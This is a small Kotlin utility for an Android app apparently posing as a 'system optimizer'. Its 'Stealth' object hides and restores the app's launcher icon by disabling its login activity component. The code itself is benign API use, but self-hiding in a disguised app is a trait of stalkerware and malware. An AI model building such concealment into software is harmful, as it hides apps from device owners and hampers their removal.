package com.system.optimizer.util

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import com.system.optimizer.ui.AuthActivity

object Stealth {

    fun hideLauncherIcon(context: Context) {
        val pm = context.packageManager
        val component = ComponentName(context, AuthActivity::class.java)
        pm.setComponentEnabledSetting(
            component,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    fun showLauncherIcon(context: Context) {
        val pm = context.packageManager
        val component = ComponentName(context, AuthActivity::class.java)
        pm.setComponentEnabledSetting(
            component,
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )
    }
}
